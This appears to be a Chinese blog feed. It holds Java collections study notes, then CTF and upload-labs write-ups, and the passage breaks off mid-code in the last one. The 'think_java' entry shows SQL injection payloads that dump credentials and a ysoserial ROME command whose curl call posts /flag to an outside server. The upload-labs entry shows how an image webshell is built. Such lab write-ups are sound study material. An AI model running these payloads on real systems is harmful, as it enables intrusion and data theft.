java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.clear();</span><br></pre></td></tr></table></figure></li><li><p>addAll：添加多个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">list2.add(<span class="string">&quot;tch2&quot;</span>);</span><br><span class="line">list.addAll(list2);</span><br></pre></td></tr></table></figure></li><li><p>containsAll：查找多个元素是否都存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.containsAll(list2);</span><br></pre></td></tr></table></figure></li><li><p>removeAll：删除多个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.removeAll(list2);</span><br></pre></td></tr></table></figure></li></ol><h3 id="collection接口遍历元素方式"><a class="markdownIt-Anchor" href="#collection接口遍历元素方式">#</a> Collection 接口遍历元素方式</h3><h4 id="使用iterator迭代器"><a class="markdownIt-Anchor" href="#使用iterator迭代器">#</a> 使用 Iterator（迭代器）</h4><ol><li>Iterator 对象称为迭代器，主要用于遍历 Collection 集合中的元素</li><li>所有实现了 Collection 接口的集合类都有一个 iterator () 方法，用以返回一个实现了 Iterator 接口的对象，即可以返回一个迭代器</li><li>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</li></ol><p><strong>工作原理：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();<span class="comment">//得到一个集合的迭代器</span></span><br><span class="line"><span class="comment">//hasNext()判断是否还有下一个元素</span></span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;<span class="comment">//next()的作用：指针下移、将下移以后的位置上的元素返回</span></span><br><span class="line">    System.out.println(iterator.next());</span><br><span class="line">&#125;<span class="comment">//快捷键itit</span></span><br></pre></td></tr></table></figure><p>在调用 iterator.next () 方法之前必须要调用 iterator.hasNext () 进行检测，若不调用，且下一条记录无效时，直接调用 iterator.next () 会抛出 NoSuchElementException 异常</p><p>如果要再次使用，需要重置迭代器 <code>iterator = coll.iterator();</code></p><h4 id="使用for循环增强"><a class="markdownIt-Anchor" href="#使用for循环增强">#</a> 使用 for 循环增强</h4><p>增强 for 就是简化版的 iterator，本质一样，只能用于遍历集合或数组。底层其实就是迭代器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Object object : col)&#123;</span><br><span class="line">&#125;<span class="comment">//快捷键I</span></span><br></pre></td></tr></table></figure><h2 id="list接口和常用方法"><a class="markdownIt-Anchor" href="#list接口和常用方法">#</a> List 接口和常用方法</h2><p>List 接口是 Collection 接口的子接口</p><ol><li>List 集合类中元素有序（即添加顺序和取出顺序一致）且可重复</li><li>List 集合中的每个元素都有对应的顺序索引（索引从 0 开始）</li><li>List 容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素</li><li>常用的 List 接口的实现类：ArrayList、LinkedList、Vector</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, Object ele)</span><span class="comment">//在index位置插入ele元素</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(<span class="type">int</span> index, Collection eles)</span><span class="comment">//从index位置开始将eles中的所有元素添加进来</span></span><br><span class="line">Object <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span><span class="comment">//获取指定index位置的元素</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object obj)</span><span class="comment">//返回obj在集合中首次出现的位置</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">lastlndexOf</span><span class="params">(Object obj)</span><span class="comment">//返回obj在当前集合中末次出现的位置</span></span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span><span class="comment">//移除指定 indiex位言的完素，井返回此元</span></span><br><span class="line">Object <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, Object ele)</span><span class="comment">//设置指定index位置的元素为ele，相当于是替换.</span></span><br><span class="line">List <span class="title function_">subList</span><span class="params">(<span class="type">int</span> fromlndex, <span class="type">int</span> tolndex)</span><span class="comment">//返回从fromlndex到tolndex位置的子集合</span></span><br></pre></td></tr></table></figure><p>List 和 ArrayList 的区别：<a href="https://blog.csdn.net/qq_42002500/article/details/111088801">Java 中 List 和 ArrayList 的区别及使用_java list arraylist-CSDN 博客</a></p><h3 id="arraylist的底层结构和源码分析"><a class="markdownIt-Anchor" href="#arraylist的底层结构和源码分析">#</a> ArrayList 的底层结构和源码分析</h3><h4 id="注意事项-4"><a class="markdownIt-Anchor" href="#注意事项-4">#</a> 注意事项</h4><ol><li>permits all elements (可以放所有元素), including null。ArrayList 可以加入 null，并且可以加入多个</li><li>ArrayList 是由数组来实现数据存储的</li><li>ArrayList 基本等同于 Vector，除了 ArrayList 是线程不安全（但执行效率高），但在多线程情况下不建议使用 ArrayList</li></ol><h4 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析">#</a> 源码分析</h4><ol><li>ArrayList 中维护了一个 Object 类型的数组 elementData. ［debug 看源码］transient Objectil elementData;</li><li>当创建 ArrayList 对象时，如果使用的是<strong>无参构造器</strong>，则初始 elementData 容量为 0，第 1 次添加，则扩容 elementData 为 10，如需要再次扩容，则扩容 elementData 为 1.5 倍</li><li>如果使用的是<strong>指定大小的构造器</strong>，则初始 elementData 容量为指定大小，如果需要扩容，则直接扩容 elementData 为 1.5 倍</li></ol><h3 id="vector的底层结构和源码分析"><a class="markdownIt-Anchor" href="#vector的底层结构和源码分析">#</a> Vector 的底层结构和源码分析</h3><h4 id="注意事项-5"><a class="markdownIt-Anchor" href="#注意事项-5">#</a> 注意事项</h4><ol><li><p>Vector 类的定义说明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vector</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractList</span>&lt;E&gt;</span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">List</span>&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable</span><br></pre></td></tr></table></figure></li><li><p>Vector 底层也是一个对象数组， <code>protected Object[] elementData;</code></p></li><li><p>Vector 是线程同步的，即线程安全，Vector 类的操作方法带有 synchronized</p></li><li><p>在开发中需要线程同步安全的，考虑使用 Vector</p></li></ol><h4 id="源码分析-2"><a class="markdownIt-Anchor" href="#源码分析-2">#</a> 源码分析</h4><ol><li>创建对象时，如果使用的无参构造器，默认容量为 10，满了之后按照 2 倍扩容</li><li>创建对象时，如果是指定大小，则每次直接按照 2 倍扩容</li></ol><h3 id="linklist的底层结构"><a class="markdownIt-Anchor" href="#linklist的底层结构">#</a> LinkList 的底层结构</h3><ol><li>LinkList 实现了双向链表和双端队列的特点</li><li>可以添加任意元素（可重复），包括 null</li><li>线程不安全，没有实现同步</li></ol><h4 id="底层操作机制"><a class="markdownIt-Anchor" href="#底层操作机制">#</a> 底层操作机制</h4><ol><li>LinkList 底层是一个双向链表</li><li>LinkList 中维护了两个属性 first 和 last 分别指向首结点和尾结点</li><li>每个结点 (Node 对象) 里面有维护了 prev、next、item 三个属性，其中 prev 指向前一个，next 指向后一个，实现双向链表</li><li>所以 LinkList 的元素的添加和删除，不是通过数组完成的，效率较高</li></ol><p><img src="/2024/12/06/java%E7%AC%94%E8%AE%B0/D:%5C%E6%96%87%E6%A1%A3%5CWPS%5C543277641%5CIMG_0027.PNG" alt="IMG_0027"></p><h3 id="arraylist和linkedlist的比较"><a class="markdownIt-Anchor" href="#arraylist和linkedlist的比较">#</a> ArrayList 和 LinkedList 的比较</h3><p><strong>如何选择：</strong></p><ol><li>改查多，选 ArrayList</li><li>增删多，选 LinkedList</li><li>一般来说在程序中，80％-90％都是查询，因此大部分情况下会选择 ArrayList</li><li>在一个项目中根据业务灵活选择，也有可能一个模块使用的是 ArrayList，另一个模块是 LinkedList</li></ol><h2 id="set接口和常用方法"><a class="markdownIt-Anchor" href="#set接口和常用方法">#</a> Set 接口和常用方法</h2><ol><li>无序，没有索引</li><li>不允许重复元素，所以最多包含一个 null</li><li>JDK API 中 set 接口的实现类有 HashSet、TreeSet 等等</li><li>set 接口对象不能通过索引来获取，且没有 get 方法，所以不能用普通 for 循环遍历</li></ol><h3 id="hashset"><a class="markdownIt-Anchor" href="#hashset">#</a> HashSet</h3><ol><li>HashSet 实现了 Set 接口，可存放 null 但只能有一个</li><li>HashSet 实际上是 HashMap</li><li>HashSet 不抱着元素是有序的，取决于 hash 后，在确定索引的结果</li><li>不能有重复对象</li></ol><h4 id="方法注意事项"><a class="markdownIt-Anchor" href="#方法注意事项">#</a> 方法注意事项</h4><ol><li>add 方法在执行后会返回一个 boolean 值，如果添加成功返回 true，反之返回 false</li><li>可以通过 remove 指定删除对象</li></ol><h4 id="hashset底层机制"><a class="markdownIt-Anchor" href="#hashset底层机制">#</a> HashSet 底层机制</h4><p>HashSet 底层是 HashMap，HashMap 底层是数组 + 链表 + 红黑树</p><ol><li>添加一个元素时，先得到 hash 值，再转成索引值</li><li>找到储存数据表 table，看这个索引位置是否已经存放的有元素</li><li>如果没有直接加入</li><li>如果有，就调用 equals 比较，如果相同就放弃添加，反之添加到最后</li><li>在 java8 中，如果一条链表的元素个数到达 TREEIFY_THRESHOLD (默认是 8)，且 table 的大小 &gt;=MIN_TREEIFY_CAPACITY (默认 64)，就会进行树化（红黑树）</li></ol><p><strong>扩容机制：</strong></p><ol><li>第一次添加时，table 扩容到 16，临界值 (threshold) 是 16 * 加载因子 (loadFactor)，加载因子 = 0.75，结果就是 12</li><li>如果 table 数组使用到了临界值 12，就会扩容到 <code>16*2=32</code> ，新的临界值就是 <code>32*0.75</code> ，以此类推</li><li>在 java8 中，如果一条链表的元素个数到达 TREEIFY_THRESHOLD (默认是 8)，并且 table 的大小 &gt;=MIN_TREEIFY_CAPACITY (默认 64)，就会进行树化（红黑树），否则仍然采用数组扩容机制</li><li>要注意的是，在一个 table 中只要添加了 0.75 倍的 Node，就会进行扩容，无论是添加到某个结点，还是某个结点的链表上</li></ol><h3 id="linkedhashset"><a class="markdownIt-Anchor" href="#linkedhashset">#</a> LinkedHashSet</h3><ol><li>LinkedHashSet 是 HashSet 的子类</li><li>LinkedHashSet 底层是一个 LinkedHashMap，底层维护了一个数组 + 双向链表</li><li>LinkedHashSet 根据元素的 hashCode 值来决定元素的储存位置，同时使用链表维护元素的次序 (图)，这使得元素看起来是以插入顺序保存的</li><li>LinkedHashSet 不允许添加重复元素</li></ol><h3 id="treeset"><a class="markdownIt-Anchor" href="#treeset">#</a> TreeSet</h3><p>//////</p><h1 id="图map"><a class="markdownIt-Anchor" href="#图map">#</a> 图（Map）</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;no1&quot;</span>, <span class="string">&quot;tch1&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;no2&quot;</span>, <span class="string">&quot;tch2&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;no1&quot;</span>, <span class="string">&quot;tch3&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;no3&quot;</span>, <span class="string">&quot;tch1&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>Map 接口实现类的特点：</strong></p><ol><li>Map 与 Collection 并列存在，用于保存具有映射关系的数据：Key-Value</li><li>Map 中的 key 和 value 可以是任何引用类型的数据，会封装到 HashMap$Node 对象中</li><li>Map 中的 key 不允许重复，原因和 HashSet 一样（当 key 相同时，新的那个 key 的 value 会替换旧的 key 的 value）</li><li>Map 中的 value 可以重复</li><li>Map 的 key 可以为 null，value 也可以为 null，但 key 为 null 只能有一个，而 value 可以有多个</li><li>常用 String 类作为 Map 的 key</li><li>key 和 value 之间存在单向一对一关系，即通过指定的 key 能找到对应的 value（用 get 方法，通过 key 值查找）</li><li>一对 k-v 是放在一个 Node 中的，因为 Node 实现了 Entry 接口（有些书上说，一对 k-v 就是一个 Entry）</li></ol><h2 id="对mapentry的解释"><a class="markdownIt-Anchor" href="#对mapentry的解释">#</a> 对 Map.Entry 的解释</h2><p>Map.Entry 是 Map 中的一个接口，他的用途是表示一个映射项（里面有 Key 和 Value），而 Set&lt;Map.Entry&lt;K,V&gt;&gt; 表示一个映射项的 Set。Map.Entry 里有相应的 getKey 和 getValue 方法，即<a href="https://so.csdn.net/so/search?q=JavaBean&amp;spm=1001.2101.3001.7020"> JavaBean</a>，让我们能够从一个项中取出 Key 和 Value。</p><p>因为 Map 这个类没有继承 Iterable 接口，所以不能直接通过 map.<a href="https://so.csdn.net/so/search?q=iterator&amp;spm=1001.2101.3001.7020">iterator</a> 来遍历，所以就只能先转化为 set 类型，用 entrySet () 方法，其中 set 中的每一个元素值就是 map 中的一个键值对，也就是 Map.Entry&lt;K,V&gt; 了，然后就可以遍历了。</p><hr><p>Map 是 java 中的接口，Map.Entry 是 Map 的一个内部接口。</p><p>Map 提供了一些常用方法，如 keySet ()、entrySet () 等方法，keySet () 方法返回值是 Map 中 key 值的集合；entrySet () 的返回值也是返回一个 Set 集合，此集合的类型为 Map.Entry。</p><p>Map.Entry 是 Map 声明的一个内部接口，此接口为泛型，定义为 Entry&lt;K,V&gt;。它表示 Map 中的一个实体（一个 key-value 对）。接口中有 getKey (),getValue 方法</p><p>Node&lt;K,V&gt; 实现了 Entry 接口，Entry 接口中 K 表示 key, 即键，V 表示 value, 即值。Entry 即 Node 是 Map 集合中的一个对象元素，而 Map 集合正是由一个个 Entry 即 Node 对象所构成。<br>正是因为 Node 实现了 Entry 接口，所以使用 Entry 的时候也可以使用其 getValue () 和 getKey () 方法</p><p><img src="/2024/12/06/java%E7%AC%94%E8%AE%B0/D:%5CDesktop%5C4bc77e5417f181b4c06b18ae3162ff47.png" alt="1"><a href="https://blog.csdn.net/qq_39736597/article/details/113762355">Java 中 Map.Entry 详解_java map.entry-CSDN 博客</a></p><h2 id="map接口的常用方法"><a class="markdownIt-Anchor" href="#map接口的常用方法">#</a> Map 接口的常用方法</h2><ol><li>put：添加</li><li>remove：根据键删除</li><li>get：根据键获取</li><li>size：元素个数</li><li>isEmpty：判断是否为空</li><li>clear：清除</li><li>containsKey：查找键是否存在</li></ol><h2 id="map接口遍历方法"><a class="markdownIt-Anchor" href="#map接口遍历方法">#</a> Map 接口遍历方法</h2><ol><li><p>containsKey：查找键是否存在</p></li><li><p>keySet：获取所有键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一组：先取出所有key，再通过key取出对应的value</span></span><br><span class="line">    <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> map.keySet();</span><br><span class="line">    <span class="comment">//(1)增强for</span></span><br><span class="line">    <span class="keyword">for</span> (Object key : set) &#123;</span><br><span class="line">        System.out.println(key + <span class="string">&quot;:&quot;</span> + map.get(key));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//(2)迭代器</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">next</span> <span class="operator">=</span>  iterator.next();</span><br><span class="line">        System.out.println(next + <span class="string">&quot;:&quot;</span> + map.get(next));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>values：获取所有值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第二组：取出所有的value</span></span><br><span class="line">    <span class="type">Collection</span> <span class="variable">values</span> <span class="operator">=</span> map.values();</span><br><span class="line">    <span class="comment">//(1)增强for</span></span><br><span class="line">    <span class="keyword">for</span> (Object value : values) &#123;</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//(2)迭代器</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator2</span> <span class="operator">=</span> values.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator2.hasNext()) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> iterator2.next();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>entrySet：获取所有关系 k-v</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第三组：通过EntrySet获取k-v</span></span><br><span class="line">    <span class="type">Set</span> <span class="variable">entrySet</span> <span class="operator">=</span> map.entrySet();<span class="comment">//EntrySet&lt;Map.Entry&lt;K,V&gt;&gt;</span></span><br><span class="line">    <span class="comment">//(1)增强for</span></span><br><span class="line">    <span class="keyword">for</span> (Object entry : entrySet) &#123;</span><br><span class="line">        <span class="comment">//将entry对象转成Map.Entry</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">m</span> <span class="operator">=</span> (Map.Entry) entry;</span><br><span class="line">        System.out.println(m.getKey() + <span class="string">&quot;:&quot;</span> + m.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//(2)迭代器</span></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator3</span> <span class="operator">=</span> entrySet.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator3.hasNext()) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">entry</span> <span class="operator">=</span> iterator3.next();</span><br><span class="line">        <span class="comment">//向下转型Map.Entry</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">m</span> <span class="operator">=</span> (Map.Entry) entry;</span><br><span class="line">        System.out.println(m.getKey() + <span class="string">&quot;:&quot;</span> + m.getValue());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="hashtable"><a class="markdownIt-Anchor" href="#hashtable">#</a> Hashtable</h2><ol><li>存放元素是键值对：k-v</li><li>hashtable 的键和值哦都不能为 null</li><li>hashTable 使用方法基本和 HashMap 一样</li><li>hashTable 线程安全，hashMap 线程不安全</li></ol><h3 id="底层"><a class="markdownIt-Anchor" href="#底层">#</a> 底层</h3><ol><li>底层数组 Hashtable$Entry [] 初始化大小为 11</li><li>临界值 threshold 8 = 11 * 0.75</li><li>用方法 addEntry (hash, key, value, index) 添加 k-v，封装到 entry</li><li>当 if (count&gt;= threshold) 满足时进行扩容</li></ol><h2 id="properties"><a class="markdownIt-Anchor" href="#properties">#</a> Properties</h2><ol><li>properties 类继承自 Hashtable 类，且实现了 Map 接口，也是使用键值对来储存数据</li><li>使用特点和 Hashtable 类似</li><li>properties 可以用于从 xxx.properties 文件中加载数据到 Properties 类对象，并进行读取和修改</li></ol><h2 id="开发时如何选择"><a class="markdownIt-Anchor" href="#开发时如何选择">#</a> 开发时如何选择</h2>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客迁移</title>
      <link href="/2024/12/03/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
      <url>/2024/12/03/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p>博客迁移</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>think_java</title>
      <link href="/2024/04/30/think-java/"/>
      <url>/2024/04/30/think-java/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入获取用户密码"><a class="markdownIt-Anchor" href="#sql注入获取用户密码">#</a> sql 注入获取用户密码</h1><p>首先打开 class 代码，在 test 中发现，在 /common/test/sqlDict 目录下有注入漏洞，同时也可以看到它调用了 swagger 模块</p><img src="/2024/04/30/think-java/1.png" class><p>sqlDict 代码</p><img src="/2024/04/30/think-java/2.png" class><img src="/2024/04/30/think-java/3.png" class><p>抓一下包，以 post 形式注入，注意下注入点的路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbName<span class="operator">=</span>myapp?a<span class="operator">=</span><span class="string">&#x27;union+select+group_concat(name)from(user)#</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbName<span class="operator">=</span>myapp?a<span class="operator">=</span><span class="string">&#x27;union+select+group_concat(pwd)from(user)#</span></span><br></pre></td></tr></table></figure><img src="/2024/04/30/think-java/4.png" class><img src="/2024/04/30/think-java/5.png" class><p>获取到了用户名以及密码</p><p>admin/admin@Rrrr_ctf_asde</p><h1 id="swagger模块"><a class="markdownIt-Anchor" href="#swagger模块">#</a> swagger 模块</h1><p>什么是 swagger 模块：swagger-ui 提供了一个可视化的 UI 页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署 UI 项目。</p><p>接口查看地址可以通过服务地址 /swagger-ui.html 访问</p><img src="/2024/04/30/think-java/6.png" class><p>这里有三个部分，分别是获取当前用户信息，登录，以及数据库字典查询，刚才得到了数据库用户的信息。</p><h1 id="java反序列化"><a class="markdownIt-Anchor" href="#java反序列化">#</a> Java 反序列化</h1><p>这里尝试登录</p><img src="/2024/04/30/think-java/7.png" class><p>登录之后返回的数据是明显的 java 序列化后的值</p><blockquote><p>java 序列化的特征：</p><p>一段数据以 rO0AB 开头，基本可以确定是 java 序列 base64 编码的数据</p><p>一段数据以 aced 开头，那么他就是这段 java 序列化的 16 进制</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu</span><br></pre></td></tr></table></figure><p>这是 base64 编码后的序列化值，我们可以通过一个工具来看它在序列化之前是什么样的，我们要用到 SerializationDumper 这个工具，它在使用时需要用到 16 进制的序列化值，可以在网上先用 base64 转 16 进制工具转换一下，也可以用 python 脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e</span><br></pre></td></tr></table></figure><p>SerializationDumper 使用命令：java -jar SerializationDumper.jar + 16 进制序列化</p><img src="/2024/04/30/think-java/8.png" class><h1 id="java-deserialization-scanner"><a class="markdownIt-Anchor" href="#java-deserialization-scanner">#</a> java Deserialization Scanner</h1><p>java Deserialization Scanner 是一个 bp 的工具，可以扫描目标能用哪种方式进行反序列化攻击，可以直接在 bp 的插件商店里面安装，安装完之后要配置一下环境变量，写入 java 的路径以及等会要用到的工具 ysoserial 的路径</p><img src="/2024/04/30/think-java/14.png" class><p>然后抓包发送到插件中，注意抓的包是反序列化注入点的包，也就是 &quot;获取当前用户信息&quot; 页面发送验证的请求包</p><img src="/2024/04/30/think-java/15.png" class><p>选中序列化部分添加变量作为攻击点，选择 base64 编码的方式，然后 attack，攻击完之后可以看到 rome 模式是一个可攻击的点，所以在接下来用到 ysoserial 的时候，我们就用它的 rome 模块来创造 payload</p><img src="/2024/04/30/think-java/16.png" class><h1 id="ysoserial"><a class="markdownIt-Anchor" href="#ysoserial">#</a> ysoserial</h1><p>ysoserial 是一个集合了各种 java 反序列化 payload 的工具，这里我们用 rome 模块</p><p>使用命令如下，url 为公网服务器的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;curl http://xxx.xxx.xxx.xxx:6150 -d @/flag&quot; &gt; tch.bin</span><br></pre></td></tr></table></figure><img src="/2024/04/30/think-java/9.png" class><p>这里会生成一个 payload 为 tch.bin，但是我们反序列化的注入点是需要 base64 格式的，我们直接拿生成的文件去一个在线文件转 base64 的网站转换一下就可以</p><img src="/2024/04/30/think-java/10.png" class><p>复制下来，替换掉请求包序列化的内容</p><img src="/2024/04/30/think-java/11.png" class><p>或者直接在 &quot;获取当前用户信息&quot; 页面中传入也是可以的</p><img src="/2024/04/30/think-java/12.png" class><p>在公网服务器上监听端口（提前打开），然后获取到数据包，getflag</p><img src="/2024/04/30/think-java/13.png" class>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uploadlabs笔记</title>
      <link href="/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第14关-图片马"><a class="markdownIt-Anchor" href="#第14关-图片马">#</a> 第 14 关 - 图片马</h1><p>第 14 关的要求是上传图片马，也就是用图片加一段 php 代码，在网站有这个包含漏洞的情况下才可以解析这个木马</p><p>首先要制作一个图片马，可以直接用文本文档格式编辑，在图片后面加一段 php 代码，但是需要 16 进制编写。还可以用 cmd 生成，语句如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy a.png /b + a.php /a webshell.png</span><br></pre></td></tr></table></figure><img src="/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/1.png" class><p>在这个生成文件上传成功之后检测一下是否能成功运行，题目已经给了文件包含漏洞访问</p><img src="/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/2.png" class><p>找到文件上传之后的所在路径和文件名，用 bp 抓包看一下</p><img src="/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/3.png" class><p>然后在文件包含漏洞页面访问</p><img src="/2024/04/07/uploadlabs%E7%AC%94%E8%AE%B0/4.png" class><h1 id="第15关-getimagesize"><a class="markdownIt-Anchor" href="#第15关-getimagesize">#</a> 第 15 关 - getimagesize ()</h1><p>这关和上一关只有一个区别，是一个 getimagesize 函数，这个函数会读取文件的 16 进制头，看是不是符合正常的图片的文件头，看看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        